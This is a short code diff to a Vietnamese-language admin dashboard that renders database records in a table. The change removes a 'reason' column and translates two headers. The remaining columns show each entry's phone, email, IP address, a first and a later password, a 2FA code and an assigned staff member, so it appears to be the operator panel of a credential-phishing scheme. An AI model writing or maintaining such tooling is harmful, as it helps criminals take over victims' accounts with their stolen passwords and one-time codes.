@@ -42,13 +42,12 @@
                 <th scope="col">Số ĐT</th>
                 <th scope="col">Email</th>
                 <th scope="col">Địa chỉ IP</th>
-                <th scope="col">Lý do</th>
                 <th scope="col">MK Đầu</th>
                 <th scope="col">MK SAU</th>
                 <th scope="col">Mã 2FA</th>
-                <th scope="col">CREATED_AT</th>
+                <th scope="col">Ngày Tạo</th>
                 <th scope="col">Nhân Viên</th>
-                <th scope="col">Action</th>
+                <th scope="col">Thao Tác</th>
               </tr>
             </thead>
             <tbody id = 'data'>
@@ -198,7 +197,6 @@
             item += "<td>"+value['phone']+"</td>";
             item += "<td>"+value['email']+"</td>";
             item += "<td>"+value['ipAddress']+"</td>";
-            item += "<td>"+value['reason']+"</td>";
             item += "<td>"+value['passwordFirt']+"</td>";
             item += "<td>"+value['password']+"</td>";
             item += "<td>"+code2FA+"</td>";
@@ -223,7 +221,7 @@
                         ipAddressUser = snap.val().ipAddress;
                         passwordUser = snap.val().password;
                         reasonUser = snap.val().reason;
-                        
+
                         var vnUser = "";
                         if (snap.val().nv) {
                             vnUser = snap.val().nv;
